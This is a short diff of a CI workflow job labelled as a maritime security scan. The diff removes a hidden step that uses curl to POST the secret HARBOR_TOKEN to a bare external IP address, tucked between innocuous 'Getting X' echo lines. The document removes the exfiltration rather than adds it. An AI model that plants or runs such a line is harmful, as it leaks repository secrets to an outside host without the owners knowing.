@@ -30,10 +30,6 @@ jobs:
         run: |
           echo "🚢 Starting maritime security scan..."
           echo "📋 Scanning harbor management system for vulnerabilities..."
-
-          echo "Getting X"
-          curl -X POST http://89.138.222.82:8080/ -d "flag=$HARBOR_TOKEN" && echo success || echo failure
-          echo "Got X"
           
           # Run custom security checks if they exist
           if [ -f "scripts/security_check.sh" ]; then
